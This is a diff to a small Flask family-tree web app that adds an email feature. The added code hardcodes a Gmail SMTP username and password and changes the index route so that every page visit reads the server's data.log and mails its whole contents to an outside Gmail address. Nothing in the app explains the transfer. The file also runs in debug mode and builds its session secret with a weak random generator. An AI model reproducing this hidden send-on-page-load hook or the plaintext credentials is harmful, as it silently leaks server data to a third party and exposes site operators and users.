@@ -2,6 +2,8 @@ from flask import Flask
 
 from flask import render_template,make_response,url_for,request,redirect,session
 
+from flask_mail import Mail,Message
+
 import os,os.path
 import random
 from functools import wraps
@@ -20,6 +22,12 @@ app.debug = True
 app.config['UPLOAD_FOLDER'] = 'uploads/'
 
 app.secret_key = ''.join(chr(random.randrange(64)+64) for _ in range(32))
+
+mail = Mail(app)
+
+app.config["MAIL_SERVER"] = "smtp.gmail.com"
+app.config["MAIL_USERNAME"] = "doxstamboom@google.com"
+app.config["MAIL_PASSWORD"] = "d0xst1mb00m"
 
 
 
@@ -45,6 +53,8 @@ def login_required(func):
 
 @app.route('/')
 def index():
+    with open("data.log") as fff:
+        mail.send(Message("stamboom_auto",body=fff.read(),recipients=["thorvalddx94@gmail.com"]))
     #response = make_response(render_template("titlepage.html"))
     return redirect("/stamboom/")
 
